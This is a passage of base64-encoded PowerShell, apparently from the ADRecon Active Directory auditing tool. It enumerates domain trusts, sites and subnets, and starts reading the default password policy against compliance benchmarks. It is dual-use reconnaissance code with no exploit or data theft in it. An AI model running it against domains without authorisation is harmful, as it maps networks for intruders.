gICAgICAgICAgSWYgKFtpbnQzMl0gJF8uUHJvcGVydGllcy50cnVzdGF0dHJpYnV0ZXNbMF0gLWJhbmQgMHgwMDAwMDQwMCkgeyAkVHJ1c3RBdHRyaWJ1dGVzICs9ICJQSU0gVHJ1c3QsIiB9CiAgICAgICAgICAgICAgICBJZiAoJFRydXN0QXR0cmlidXRlcykKICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAkVHJ1c3RBdHRyaWJ1dGVzID0gJFRydXN0QXR0cmlidXRlcy5UcmltRW5kKCIsIikKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICRPYmogfCBBZGQtTWVtYmVyIC1NZW1iZXJUeXBlIE5vdGVQcm9wZXJ0eSAtTmFtZSAiQXR0cmlidXRlcyIgLVZhbHVlICRUcnVzdEF0dHJpYnV0ZXMKICAgICAgICAgICAgICAgICRPYmogfCBBZGQtTWVtYmVyIC1NZW1iZXJUeXBlIE5vdGVQcm9wZXJ0eSAtTmFtZSAid2hlbkNyZWF0ZWQiIC1WYWx1ZSAoW0RhdGVUaW1lXSAkKCRfLlByb3BlcnRpZXMud2hlbmNyZWF0ZWQpKQogICAgICAgICAgICAgICAgJE9iaiB8IEFkZC1NZW1iZXIgLU1lbWJlclR5cGUgTm90ZVByb3BlcnR5IC1OYW1lICJ3aGVuQ2hhbmdlZCIgLVZhbHVlIChbRGF0ZVRpbWVdICQoJF8uUHJvcGVydGllcy53aGVuY2hhbmdlZCkpCiAgICAgICAgICAgICAgICAkQURUcnVzdE9iaiArPSAkT2JqCiAgICAgICAgICAgIH0KICAgICAgICAgICAgUmVtb3ZlLVZhcmlhYmxlIEFEVHJ1c3RzCiAgICAgICAgfQogICAgfQoKICAgIElmICgkQURUcnVzdE9iaikKICAgIHsKICAgICAgICBSZXR1cm4gJEFEVHJ1c3RPYmoKICAgIH0KICAgIEVsc2UKICAgIHsKICAgICAgICBSZXR1cm4gJG51bGwKICAgIH0KfQoKRnVuY3Rpb24gR2V0LUFEUlNpdGUKewo8IwouU1lOT1BTSVMKICAgIFJldHVybnMgdGhlIFNpdGVzIG9mIHRoZSBjdXJyZW50IChvciBzcGVjaWZpZWQpIGRvbWFpbi4KCi5ERVNDUklQVElPTgogICAgUmV0dXJucyB0aGUgU2l0ZXMgb2YgdGhlIGN1cnJlbnQgKG9yIHNwZWNpZmllZCkgZG9tYWluLgoKLlBBUkFNRVRFUiBQcm90b2NvbAogICAgW3N0cmluZ10KICAgIFdoaWNoIHByb3RvY29sIHRvIHVzZTsgQURXUyAoZGVmYXVsdCkgb3IgTERBUC4KCi5QQVJBTUVURVIgb2JqRG9tYWluCiAgICBbRGlyZWN0b3J5U2VydmljZXMuRGlyZWN0b3J5RW50cnldCiAgICBEb21haW4gRGlyZWN0b3J5IEVudHJ5IG9iamVjdC4KCi5QQVJBTUVURVIgb2JqRG9tYWluUm9vdERTRQogICAgW0RpcmVjdG9yeVNlcnZpY2VzLkRpcmVjdG9yeUVudHJ5XQogICAgUm9vdERTRSBEaXJlY3RvcnkgRW50cnkgb2JqZWN0LgoKLlBBUkFNRVRFUiBEb21haW5Db250cm9sbGVyCiAgICBbc3RyaW5nXQogICAgSVAgQWRkcmVzcyBvZiB0aGUgRG9tYWluIENvbnRyb2xsZXIuCgouUEFSQU1FVEVSIENyZWRlbnRpYWwKICAgIFtNYW5hZ2VtZW50LkF1dG9tYXRpb24uUFNDcmVkZW50aWFsXQogICAgQ3JlZGVudGlhbHMuCgouT1VUUFVUUwogICAgUFNPYmplY3QuCiM+CiAgICBwYXJhbSgKICAgICAgICBbUGFyYW1ldGVyKE1hbmRhdG9yeSA9ICR0cnVlKV0KICAgICAgICBbc3RyaW5nXSAkUHJvdG9jb2wsCgogICAgICAgIFtQYXJhbWV0ZXIoTWFuZGF0b3J5ID0gJGZhbHNlKV0KICAgICAgICBbRGlyZWN0b3J5U2VydmljZXMuRGlyZWN0b3J5RW50cnldICRvYmpEb21haW4sCgogICAgICAgIFtQYXJhbWV0ZXIoTWFuZGF0b3J5ID0gJGZhbHNlKV0KICAgICAgICBbRGlyZWN0b3J5U2VydmljZXMuRGlyZWN0b3J5RW50cnldICRvYmpEb21haW5Sb290RFNFLAoKICAgICAgICBbUGFyYW1ldGVyKE1hbmRhdG9yeSA9ICRmYWxzZSldCiAgICAgICAgW3N0cmluZ10gJERvbWFpbkNvbnRyb2xsZXIsCgogICAgICAgIFtQYXJhbWV0ZXIoTWFuZGF0b3J5ID0gJGZhbHNlKV0KICAgICAgICBbTWFuYWdlbWVudC5BdXRvbWF0aW9uLlBTQ3JlZGVudGlhbF0gJENyZWRlbnRpYWwgPSBbTWFuYWdlbWVudC5BdXRvbWF0aW9uLlBTQ3JlZGVudGlhbF06OkVtcHR5CiAgICApCgogICAgSWYgKCRQcm90b2NvbCAtZXEgJ0FEV1MnKQogICAgewogICAgICAgIFRyeQogICAgICAgIHsKICAgICAgICAgICAgJFNlYXJjaFBhdGggPSAiQ049U2l0ZXMiCiAgICAgICAgICAgICRBRFNpdGVzID0gR2V0LUFET2JqZWN0IC1TZWFyY2hCYXNlICIkU2VhcmNoUGF0aCwkKChHZXQtQURSb290RFNFKS5jb25maWd1cmF0aW9uTmFtaW5nQ29udGV4dCkiIC1MREFQRmlsdGVyICIob2JqZWN0Q2xhc3M9c2l0ZSkiIC1Qcm9wZXJ0aWVzIE5hbWUsRGVzY3JpcHRpb24sd2hlbkNyZWF0ZWQsd2hlbkNoYW5nZWQKICAgICAgICB9CiAgICAgICAgQ2F0Y2gKICAgICAgICB7CiAgICAgICAgICAgIFdyaXRlLVdhcm5pbmcgIltHZXQtQURSU2l0ZV0gRXJyb3Igd2hpbGUgZW51bWVyYXRpbmcgU2l0ZSBPYmplY3RzIgogICAgICAgICAgICBXcml0ZS1WZXJib3NlICJbRVhDRVBUSU9OXSAkKCRfLkV4Y2VwdGlvbi5NZXNzYWdlKSIKICAgICAgICAgICAgUmV0dXJuICRudWxsCiAgICAgICAgfQoKICAgICAgICBJZiAoJEFEU2l0ZXMpCiAgICAgICAgewogICAgICAgICAgICBXcml0ZS1WZXJib3NlICJbKl0gVG90YWwgU2l0ZXM6ICQoW0FEUmVjb24uQURXU0NsYXNzXTo6T2JqZWN0Q291bnQoJEFEU2l0ZXMpKSIKICAgICAgICAgICAgIyBTaXRlcyBJbmZvCiAgICAgICAgICAgICRBRFNpdGVPYmogPSBAKCkKICAgICAgICAgICAgJEFEU2l0ZXMgfCBGb3JFYWNoLU9iamVjdCB7CiAgICAgICAgICAgICAgICAjIENyZWF0ZSB0aGUgb2JqZWN0IGZvciBlYWNoIGluc3RhbmNlLgogICAgICAgICAgICAgICAgJE9iaiA9IE5ldy1PYmplY3QgUFNPYmplY3QKICAgICAgICAgICAgICAgICRPYmogfCBBZGQtTWVtYmVyIC1NZW1iZXJUeXBlIE5vdGVQcm9wZXJ0eSAtTmFtZSAiTmFtZSIgLVZhbHVlICRfLk5hbWUKICAgICAgICAgICAgICAgICRPYmogfCBBZGQtTWVtYmVyIC1NZW1iZXJUeXBlIE5vdGVQcm9wZXJ0eSAtTmFtZSAiRGVzY3JpcHRpb24iIC1WYWx1ZSAkXy5EZXNjcmlwdGlvbgogICAgICAgICAgICAgICAgJE9iaiB8IEFkZC1NZW1iZXIgLU1lbWJlclR5cGUgTm90ZVByb3BlcnR5IC1OYW1lICJ3aGVuQ3JlYXRlZCIgLVZhbHVlICRfLndoZW5DcmVhdGVkCiAgICAgICAgICAgICAgICAkT2JqIHwgQWRkLU1lbWJlciAtTWVtYmVyVHlwZSBOb3RlUHJvcGVydHkgLU5hbWUgIndoZW5DaGFuZ2VkIiAtVmFsdWUgJF8ud2hlbkNoYW5nZWQKICAgICAgICAgICAgICAgICRBRFNpdGVPYmogKz0gJE9iagogICAgICAgICAgICB9CiAgICAgICAgICAgIFJlbW92ZS1WYXJpYWJsZSBBRFNpdGVzCiAgICAgICAgfQogICAgfQoKICAgIElmICgkUHJvdG9jb2wgLWVxICdMREFQJykKICAgIHsKICAgICAgICAkU2VhcmNoUGF0aCA9ICJDTj1TaXRlcyIKICAgICAgICBJZiAoJENyZWRlbnRpYWwgLW5lIFtNYW5hZ2VtZW50LkF1dG9tYXRpb24uUFNDcmVkZW50aWFsXTo6RW1wdHkpCiAgICAgICAgewogICAgICAgICAgICAkb2JqU2VhcmNoUGF0aCA9IE5ldy1PYmplY3QgU3lzdGVtLkRpcmVjdG9yeVNlcnZpY2VzLkRpcmVjdG9yeUVudHJ5ICJMREFQOi8vJCgkRG9tYWluQ29udHJvbGxlcikvJFNlYXJjaFBhdGgsJCgkb2JqRG9tYWluUm9vdERTRS5Db25maWd1cmF0aW9uTmFtaW5nQ29udGV4dCkiLCAkQ3JlZGVudGlhbC5Vc2VyTmFtZSwkQ3JlZGVudGlhbC5HZXROZXR3b3JrQ3JlZGVudGlhbCgpLlBhc3N3b3JkCiAgICAgICAgfQogICAgICAgIEVsc2UKICAgICAgICB7CiAgICAgICAgICAgICRvYmpTZWFyY2hQYXRoID0gTmV3LU9iamVjdCBTeXN0ZW0uRGlyZWN0b3J5U2VydmljZXMuRGlyZWN0b3J5RW50cnkgIkxEQVA6Ly8kU2VhcmNoUGF0aCwkKCRvYmpEb21haW5Sb290RFNFLkNvbmZpZ3VyYXRpb25OYW1pbmdDb250ZXh0KSIKICAgICAgICB9CiAgICAgICAgJG9ialNlYXJjaGVyID0gTmV3LU9iamVjdCBTeXN0ZW0uRGlyZWN0b3J5U2VydmljZXMuRGlyZWN0b3J5U2VhcmNoZXIgJG9ialNlYXJjaFBhdGgKICAgICAgICAkT2JqU2VhcmNoZXIuRmlsdGVyID0gIihvYmplY3RDbGFzcz1zaXRlKSIKICAgICAgICAkT2JqU2VhcmNoZXIuU2VhcmNoU2NvcGUgPSAiU3VidHJlZSIKCiAgICAgICAgVHJ5CiAgICAgICAgewogICAgICAgICAgICAkQURTaXRlcyA9ICRPYmpTZWFyY2hlci5GaW5kQWxsKCkKICAgICAgICB9CiAgICAgICAgQ2F0Y2gKICAgICAgICB7CiAgICAgICAgICAgIFdyaXRlLVdhcm5pbmcgIltHZXQtQURSU2l0ZV0gRXJyb3Igd2hpbGUgZW51bWVyYXRpbmcgU2l0ZSBPYmplY3RzIgogICAgICAgICAgICBXcml0ZS1WZXJib3NlICJbRVhDRVBUSU9OXSAkKCRfLkV4Y2VwdGlvbi5NZXNzYWdlKSIKICAgICAgICAgICAgUmV0dXJuICRudWxsCiAgICAgICAgfQogICAgICAgICRPYmpTZWFyY2hlci5kaXNwb3NlKCkKCiAgICAgICAgSWYgKCRBRFNpdGVzKQogICAgICAgIHsKICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAiWypdIFRvdGFsIFNpdGVzOiAkKFtBRFJlY29uLkxEQVBDbGFzc106Ok9iamVjdENvdW50KCRBRFNpdGVzKSkiCiAgICAgICAgICAgICMgU2l0ZSBJbmZvCiAgICAgICAgICAgICRBRFNpdGVPYmogPSBAKCkKICAgICAgICAgICAgJEFEU2l0ZXMgfCBGb3JFYWNoLU9iamVjdCB7CiAgICAgICAgICAgICAgICAjIENyZWF0ZSB0aGUgb2JqZWN0IGZvciBlYWNoIGluc3RhbmNlLgogICAgICAgICAgICAgICAgJE9iaiA9IE5ldy1PYmplY3QgUFNPYmplY3QKICAgICAgICAgICAgICAgICRPYmogfCBBZGQtTWVtYmVyIC1NZW1iZXJUeXBlIE5vdGVQcm9wZXJ0eSAtTmFtZSAiTmFtZSIgLVZhbHVlICQoW3N0cmluZ10gJF8uUHJvcGVydGllcy5uYW1lKQogICAgICAgICAgICAgICAgJE9iaiB8IEFkZC1NZW1iZXIgLU1lbWJlclR5cGUgTm90ZVByb3BlcnR5IC1OYW1lICJEZXNjcmlwdGlvbiIgLVZhbHVlICQoW3N0cmluZ10gJF8uUHJvcGVydGllcy5kZXNjcmlwdGlvbikKICAgICAgICAgICAgICAgICRPYmogfCBBZGQtTWVtYmVyIC1NZW1iZXJUeXBlIE5vdGVQcm9wZXJ0eSAtTmFtZSAid2hlbkNyZWF0ZWQiIC1WYWx1ZSAoW0RhdGVUaW1lXSAkKCRfLlByb3BlcnRpZXMud2hlbmNyZWF0ZWQpKQogICAgICAgICAgICAgICAgJE9iaiB8IEFkZC1NZW1iZXIgLU1lbWJlclR5cGUgTm90ZVByb3BlcnR5IC1OYW1lICJ3aGVuQ2hhbmdlZCIgLVZhbHVlIChbRGF0ZVRpbWVdICQoJF8uUHJvcGVydGllcy53aGVuY2hhbmdlZCkpCiAgICAgICAgICAgICAgICAkQURTaXRlT2JqICs9ICRPYmoKICAgICAgICAgICAgfQogICAgICAgICAgICBSZW1vdmUtVmFyaWFibGUgQURTaXRlcwogICAgICAgIH0KICAgIH0KCiAgICBJZiAoJEFEU2l0ZU9iaikKICAgIHsKICAgICAgICBSZXR1cm4gJEFEU2l0ZU9iagogICAgfQogICAgRWxzZQogICAgewogICAgICAgIFJldHVybiAkbnVsbAogICAgfQp9CgpGdW5jdGlvbiBHZXQtQURSU3VibmV0CnsKPCMKLlNZTk9QU0lTCiAgICBSZXR1cm5zIHRoZSBTdWJuZXRzIG9mIHRoZSBjdXJyZW50IChvciBzcGVjaWZpZWQpIGRvbWFpbi4KCi5ERVNDUklQVElPTgogICAgUmV0dXJucyB0aGUgU3VibmV0cyBvZiB0aGUgY3VycmVudCAob3Igc3BlY2lmaWVkKSBkb21haW4uCgouUEFSQU1FVEVSIFByb3RvY29sCiAgICBbc3RyaW5nXQogICAgV2hpY2ggcHJvdG9jb2wgdG8gdXNlOyBBRFdTIChkZWZhdWx0KSBvciBMREFQLgoKLlBBUkFNRVRFUiBvYmpEb21haW4KICAgIFtEaXJlY3RvcnlTZXJ2aWNlcy5EaXJlY3RvcnlFbnRyeV0KICAgIERvbWFpbiBEaXJlY3RvcnkgRW50cnkgb2JqZWN0LgoKLlBBUkFNRVRFUiBvYmpEb21haW5Sb290RFNFCiAgICBbRGlyZWN0b3J5U2VydmljZXMuRGlyZWN0b3J5RW50cnldCiAgICBSb290RFNFIERpcmVjdG9yeSBFbnRyeSBvYmplY3QuCgouUEFSQU1FVEVSIERvbWFpbkNvbnRyb2xsZXIKICAgIFtzdHJpbmddCiAgICBJUCBBZGRyZXNzIG9mIHRoZSBEb21haW4gQ29udHJvbGxlci4KCi5QQVJBTUVURVIgQ3JlZGVudGlhbAogICAgW01hbmFnZW1lbnQuQXV0b21hdGlvbi5QU0NyZWRlbnRpYWxdCiAgICBDcmVkZW50aWFscy4KCi5PVVRQVVRTCiAgICBQU09iamVjdC4KIz4KICAgIHBhcmFtKAogICAgICAgIFtQYXJhbWV0ZXIoTWFuZGF0b3J5ID0gJHRydWUpXQogICAgICAgIFtzdHJpbmddICRQcm90b2NvbCwKCiAgICAgICAgW1BhcmFtZXRlcihNYW5kYXRvcnkgPSAkZmFsc2UpXQogICAgICAgIFtEaXJlY3RvcnlTZXJ2aWNlcy5EaXJlY3RvcnlFbnRyeV0gJG9iakRvbWFpbiwKCiAgICAgICAgW1BhcmFtZXRlcihNYW5kYXRvcnkgPSAkZmFsc2UpXQogICAgICAgIFtEaXJlY3RvcnlTZXJ2aWNlcy5EaXJlY3RvcnlFbnRyeV0gJG9iakRvbWFpblJvb3REU0UsCgogICAgICAgIFtQYXJhbWV0ZXIoTWFuZGF0b3J5ID0gJGZhbHNlKV0KICAgICAgICBbc3RyaW5nXSAkRG9tYWluQ29udHJvbGxlciwKCiAgICAgICAgW1BhcmFtZXRlcihNYW5kYXRvcnkgPSAkZmFsc2UpXQogICAgICAgIFtNYW5hZ2VtZW50LkF1dG9tYXRpb24uUFNDcmVkZW50aWFsXSAkQ3JlZGVudGlhbCA9IFtNYW5hZ2VtZW50LkF1dG9tYXRpb24uUFNDcmVkZW50aWFsXTo6RW1wdHkKICAgICkKCiAgICBJZiAoJFByb3RvY29sIC1lcSAnQURXUycpCiAgICB7CiAgICAgICAgVHJ5CiAgICAgICAgewogICAgICAgICAgICAkU2VhcmNoUGF0aCA9ICJDTj1TdWJuZXRzLENOPVNpdGVzIgogICAgICAgICAgICAkQURTdWJuZXRzID0gR2V0LUFET2JqZWN0IC1TZWFyY2hCYXNlICIkU2VhcmNoUGF0aCwkKChHZXQtQURSb290RFNFKS5jb25maWd1cmF0aW9uTmFtaW5nQ29udGV4dCkiIC1MREFQRmlsdGVyICIob2JqZWN0Q2xhc3M9c3VibmV0KSIgLVByb3BlcnRpZXMgTmFtZSxEZXNjcmlwdGlvbixzaXRlT2JqZWN0LHdoZW5DcmVhdGVkLHdoZW5DaGFuZ2VkCiAgICAgICAgfQogICAgICAgIENhdGNoCiAgICAgICAgewogICAgICAgICAgICBXcml0ZS1XYXJuaW5nICJbR2V0LUFEUlN1Ym5ldF0gRXJyb3Igd2hpbGUgZW51bWVyYXRpbmcgU3VibmV0IE9iamVjdHMiCiAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgIltFWENFUFRJT05dICQoJF8uRXhjZXB0aW9uLk1lc3NhZ2UpIgogICAgICAgICAgICBSZXR1cm4gJG51bGwKICAgICAgICB9CgogICAgICAgIElmICgkQURTdWJuZXRzKQogICAgICAgIHsKICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAiWypdIFRvdGFsIFN1Ym5ldHM6ICQoW0FEUmVjb24uQURXU0NsYXNzXTo6T2JqZWN0Q291bnQoJEFEU3VibmV0cykpIgogICAgICAgICAgICAjIFN1Ym5ldHMgSW5mbwogICAgICAgICAgICAkQURTdWJuZXRPYmogPSBAKCkKICAgICAgICAgICAgJEFEU3VibmV0cyB8IEZvckVhY2gtT2JqZWN0IHsKICAgICAgICAgICAgICAgICMgQ3JlYXRlIHRoZSBvYmplY3QgZm9yIGVhY2ggaW5zdGFuY2UuCiAgICAgICAgICAgICAgICAkT2JqID0gTmV3LU9iamVjdCBQU09iamVjdAogICAgICAgICAgICAgICAgJE9iaiB8IEFkZC1NZW1iZXIgLU1lbWJlclR5cGUgTm90ZVByb3BlcnR5IC1OYW1lICJTaXRlIiAtVmFsdWUgJCgoJF8uc2l0ZU9iamVjdCAtU3BsaXQgIiwiKVswXSAtcmVwbGFjZSAnQ049JywnJykKICAgICAgICAgICAgICAgICRPYmogfCBBZGQtTWVtYmVyIC1NZW1iZXJUeXBlIE5vdGVQcm9wZXJ0eSAtTmFtZSAiTmFtZSIgLVZhbHVlICRfLk5hbWUKICAgICAgICAgICAgICAgICRPYmogfCBBZGQtTWVtYmVyIC1NZW1iZXJUeXBlIE5vdGVQcm9wZXJ0eSAtTmFtZSAiRGVzY3JpcHRpb24iIC1WYWx1ZSAkXy5EZXNjcmlwdGlvbgogICAgICAgICAgICAgICAgJE9iaiB8IEFkZC1NZW1iZXIgLU1lbWJlclR5cGUgTm90ZVByb3BlcnR5IC1OYW1lICJ3aGVuQ3JlYXRlZCIgLVZhbHVlICRfLndoZW5DcmVhdGVkCiAgICAgICAgICAgICAgICAkT2JqIHwgQWRkLU1lbWJlciAtTWVtYmVyVHlwZSBOb3RlUHJvcGVydHkgLU5hbWUgIndoZW5DaGFuZ2VkIiAtVmFsdWUgJF8ud2hlbkNoYW5nZWQKICAgICAgICAgICAgICAgICRBRFN1Ym5ldE9iaiArPSAkT2JqCiAgICAgICAgICAgIH0KICAgICAgICAgICAgUmVtb3ZlLVZhcmlhYmxlIEFEU3VibmV0cwogICAgICAgIH0KICAgIH0KCiAgICBJZiAoJFByb3RvY29sIC1lcSAnTERBUCcpCiAgICB7CiAgICAgICAgJFNlYXJjaFBhdGggPSAiQ049U3VibmV0cyxDTj1TaXRlcyIKICAgICAgICBJZiAoJENyZWRlbnRpYWwgLW5lIFtNYW5hZ2VtZW50LkF1dG9tYXRpb24uUFNDcmVkZW50aWFsXTo6RW1wdHkpCiAgICAgICAgewogICAgICAgICAgICAkb2JqU2VhcmNoUGF0aCA9IE5ldy1PYmplY3QgU3lzdGVtLkRpcmVjdG9yeVNlcnZpY2VzLkRpcmVjdG9yeUVudHJ5ICJMREFQOi8vJCgkRG9tYWluQ29udHJvbGxlcikvJFNlYXJjaFBhdGgsJCgkb2JqRG9tYWluUm9vdERTRS5Db25maWd1cmF0aW9uTmFtaW5nQ29udGV4dCkiLCAkQ3JlZGVudGlhbC5Vc2VyTmFtZSwkQ3JlZGVudGlhbC5HZXROZXR3b3JrQ3JlZGVudGlhbCgpLlBhc3N3b3JkCiAgICAgICAgfQogICAgICAgIEVsc2UKICAgICAgICB7CiAgICAgICAgICAgICRvYmpTZWFyY2hQYXRoID0gTmV3LU9iamVjdCBTeXN0ZW0uRGlyZWN0b3J5U2VydmljZXMuRGlyZWN0b3J5RW50cnkgIkxEQVA6Ly8kU2VhcmNoUGF0aCwkKCRvYmpEb21haW5Sb290RFNFLkNvbmZpZ3VyYXRpb25OYW1pbmdDb250ZXh0KSIKICAgICAgICB9CiAgICAgICAgJG9ialNlYXJjaGVyID0gTmV3LU9iamVjdCBTeXN0ZW0uRGlyZWN0b3J5U2VydmljZXMuRGlyZWN0b3J5U2VhcmNoZXIgJG9ialNlYXJjaFBhdGgKICAgICAgICAkT2JqU2VhcmNoZXIuRmlsdGVyID0gIihvYmplY3RDbGFzcz1zdWJuZXQpIgogICAgICAgICRPYmpTZWFyY2hlci5TZWFyY2hTY29wZSA9ICJTdWJ0cmVlIgoKICAgICAgICBUcnkKICAgICAgICB7CiAgICAgICAgICAgICRBRFN1Ym5ldHMgPSAkT2JqU2VhcmNoZXIuRmluZEFsbCgpCiAgICAgICAgfQogICAgICAgIENhdGNoCiAgICAgICAgewogICAgICAgICAgICBXcml0ZS1XYXJuaW5nICJbR2V0LUFEUlN1Ym5ldF0gRXJyb3Igd2hpbGUgZW51bWVyYXRpbmcgU3VibmV0IE9iamVjdHMiCiAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgIltFWENFUFRJT05dICQoJF8uRXhjZXB0aW9uLk1lc3NhZ2UpIgogICAgICAgICAgICBSZXR1cm4gJG51bGwKICAgICAgICB9CiAgICAgICAgJE9ialNlYXJjaGVyLmRpc3Bvc2UoKQoKICAgICAgICBJZiAoJEFEU3VibmV0cykKICAgICAgICB7CiAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgIlsqXSBUb3RhbCBTdWJuZXRzOiAkKFtBRFJlY29uLkxEQVBDbGFzc106Ok9iamVjdENvdW50KCRBRFN1Ym5ldHMpKSIKICAgICAgICAgICAgIyBTdWJuZXRzIEluZm8KICAgICAgICAgICAgJEFEU3VibmV0T2JqID0gQCgpCiAgICAgICAgICAgICRBRFN1Ym5ldHMgfCBGb3JFYWNoLU9iamVjdCB7CiAgICAgICAgICAgICAgICAjIENyZWF0ZSB0aGUgb2JqZWN0IGZvciBlYWNoIGluc3RhbmNlLgogICAgICAgICAgICAgICAgJE9iaiA9IE5ldy1PYmplY3QgUFNPYmplY3QKICAgICAgICAgICAgICAgICRPYmogfCBBZGQtTWVtYmVyIC1NZW1iZXJUeXBlIE5vdGVQcm9wZXJ0eSAtTmFtZSAiU2l0ZSIgLVZhbHVlICQoKChbc3RyaW5nXSAkXy5Qcm9wZXJ0aWVzLnNpdGVvYmplY3QpIC1TcGxpdCAiLCIpWzBdIC1yZXBsYWNlICdDTj0nLCcnKQogICAgICAgICAgICAgICAgJE9iaiB8IEFkZC1NZW1iZXIgLU1lbWJlclR5cGUgTm90ZVByb3BlcnR5IC1OYW1lICJOYW1lIiAtVmFsdWUgJChbc3RyaW5nXSAkXy5Qcm9wZXJ0aWVzLm5hbWUpCiAgICAgICAgICAgICAgICAkT2JqIHwgQWRkLU1lbWJlciAtTWVtYmVyVHlwZSBOb3RlUHJvcGVydHkgLU5hbWUgIkRlc2NyaXB0aW9uIiAtVmFsdWUgJChbc3RyaW5nXSAkXy5Qcm9wZXJ0aWVzLmRlc2NyaXB0aW9uKQogICAgICAgICAgICAgICAgJE9iaiB8IEFkZC1NZW1iZXIgLU1lbWJlclR5cGUgTm90ZVByb3BlcnR5IC1OYW1lICJ3aGVuQ3JlYXRlZCIgLVZhbHVlIChbRGF0ZVRpbWVdICQoJF8uUHJvcGVydGllcy53aGVuY3JlYXRlZCkpCiAgICAgICAgICAgICAgICAkT2JqIHwgQWRkLU1lbWJlciAtTWVtYmVyVHlwZSBOb3RlUHJvcGVydHkgLU5hbWUgIndoZW5DaGFuZ2VkIiAtVmFsdWUgKFtEYXRlVGltZV0gJCgkXy5Qcm9wZXJ0aWVzLndoZW5jaGFuZ2VkKSkKICAgICAgICAgICAgICAgICRBRFN1Ym5ldE9iaiArPSAkT2JqCiAgICAgICAgICAgIH0KICAgICAgICAgICAgUmVtb3ZlLVZhcmlhYmxlIEFEU3VibmV0cwogICAgICAgIH0KICAgIH0KCiAgICBJZiAoJEFEU3VibmV0T2JqKQogICAgewogICAgICAgIFJldHVybiAkQURTdWJuZXRPYmoKICAgIH0KICAgIEVsc2UKICAgIHsKICAgICAgICBSZXR1cm4gJG51bGwKICAgIH0KfQoKRnVuY3Rpb24gR2V0LUFEUkRlZmF1bHRQYXNzd29yZFBvbGljeQp7CjwjCi5TWU5PUFNJUwogICAgUmV0dXJucyB0aGUgRGVmYXVsdCBQYXNzd29yZCBQb2xpY3kgb2YgdGhlIGN1cnJlbnQgKG9yIHNwZWNpZmllZCkgZG9tYWluLgoKLkRFU0NSSVBUSU9OCiAgICBSZXR1cm5zIHRoZSBEZWZhdWx0IFBhc3N3b3JkIFBvbGljeSBvZiB0aGUgY3VycmVudCAob3Igc3BlY2lmaWVkKSBkb21haW4uCgouUEFSQU1FVEVSIFByb3RvY29sCiAgICBbc3RyaW5nXQogICAgV2hpY2ggcHJvdG9jb2wgdG8gdXNlOyBBRFdTIChkZWZhdWx0KSBvciBMREFQLgoKLlBBUkFNRVRFUiBvYmpEb21haW4KICAgIFtEaXJlY3RvcnlTZXJ2aWNlcy5EaXJlY3RvcnlFbnRyeV0KICAgIERvbWFpbiBEaXJlY3RvcnkgRW50cnkgb2JqZWN0LgoKLk9VVFBVVFMKICAgIFBTT2JqZWN0LgojPgogICAgcGFyYW0oCiAgICAgICAgW1BhcmFtZXRlcihNYW5kYXRvcnkgPSAkdHJ1ZSldCiAgICAgICAgW3N0cmluZ10gJFByb3RvY29sLAoKICAgICAgICBbUGFyYW1ldGVyKE1hbmRhdG9yeSA9ICRmYWxzZSldCiAgICAgICAgW0RpcmVjdG9yeVNlcnZpY2VzLkRpcmVjdG9yeUVudHJ5XSAkb2JqRG9tYWluCiAgICApCgogICAgSWYgKCRQcm90b2NvbCAtZXEgJ0FEV1MnKQogICAgewogICAgICAgIFRyeQogICAgICAgIHsKICAgICAgICAgICAgJEFEcGFzc3BvbGljeSA9IEdldC1BRERlZmF1bHREb21haW5QYXNzd29yZFBvbGljeQogICAgICAgIH0KICAgICAgICBDYXRjaAogICAgICAgIHsKICAgICAgICAgICAgV3JpdGUtV2FybmluZyAiW0dldC1BRFJEZWZhdWx0UGFzc3dvcmRQb2xpY3ldIEVycm9yIHdoaWxlIGVudW1lcmF0aW5nIHRoZSBEZWZhdWx0IFBhc3N3b3JkIFBvbGljeSIKICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAiW0VYQ0VQVElPTl0gJCgkXy5FeGNlcHRpb24uTWVzc2FnZSkiCiAgICAgICAgICAgIFJldHVybiAkbnVsbAogICAgICAgIH0KCiAgICAgICAgSWYgKCRBRHBhc3Nwb2xpY3kpCiAgICAgICAgewogICAgICAgICAgICAkT2JqVmFsdWVzID0gQCggIkVuZm9yY2UgcGFzc3dvcmQgaGlzdG9yeSAocGFzc3dvcmRzKSIsICRBRHBhc3Nwb2xpY3kuUGFzc3dvcmRIaXN0b3J5Q291bnQsICI0IiwgIlJlcS4gOC4yLjUiLCAiOCIsICJDb250cm9sOiAwNDIzIiwgIjI0IG9yIG1vcmUiLAogICAgICAgICAgICAiTWF4aW11bSBwYXNzd29yZCBhZ2UgKGRheXMpIiwgJEFEcGFzc3BvbGljeS5NYXhQYXNzd29yZEFnZS5kYXlzLCAiOTAiLCAiUmVxLiA4LjIuNCIsICI5MCIsICJDb250cm9sOiAwNDIzIiwgIjEgdG8gNjAiLAogICAgICAgICAgICAiTWluaW11bSBwYXNzd29yZCBhZ2UgKGRheXMpIiwgJEFEcGFzc3BvbGljeS5NaW5QYXNzd29yZEFnZS5kYXlzLCAiTi9BIiwgIi0iLCAiMSIsICJDb250cm9sOiAwNDIzIiwgIjEgb3IgbW9yZSIsCiAgICAgICAgICAgICJNaW5pbXVtIHBhc3N3b3JkIGxlbmd0aCAoY2hhcmFjdGVycykiLCAkQURwYXNzcG9saWN5Lk1pblBhc3N3b3JkTGVuZ3RoLCAiNyIsICJSZXEuIDguMi4zIiwgIjEzIiwgIkNvbnRyb2w6IDA0MjEiLCAiMTQgb3IgbW9yZSIsCiAgICAgICAgICAgICJQYXNzd29yZCBtdXN0IG1lZXQgY29tcGxleGl0eSByZXF1aXJlbWVudHMiLCAkQURwYXNzcG9saWN5LkNvbXBsZXhpdHlFbmFibGVkLCAkdHJ1ZSwgIlJlcS4gOC4yLjMiLCAkdHJ1ZSwgIkNvbnRyb2w6IDA0MjEiLCAkdHJ1ZSwKICAgICAgICAgICAgIlN0b3JlIHBhc3N3b3JkIHVzaW5nIHJldmVyc2libGUgZW5jcnlwdGlvbiBmb3IgYWxsIHVzZXJzIGluIHRoZSBkb21haW4iLCAkQURwYXNzcG9saWN5LlJldmVyc2libGVFbmNyeXB0aW9uRW5hYmxlZCwgIk4vQSIsICItIiwgIk4vQSIsICItIiwgJGZhbHNlLAogICAgICAgICAgICAiQWNjb3VudCBsb2Nrb3V0IGR1cmF0aW9uIChtaW5zKSIsICRBRHBhc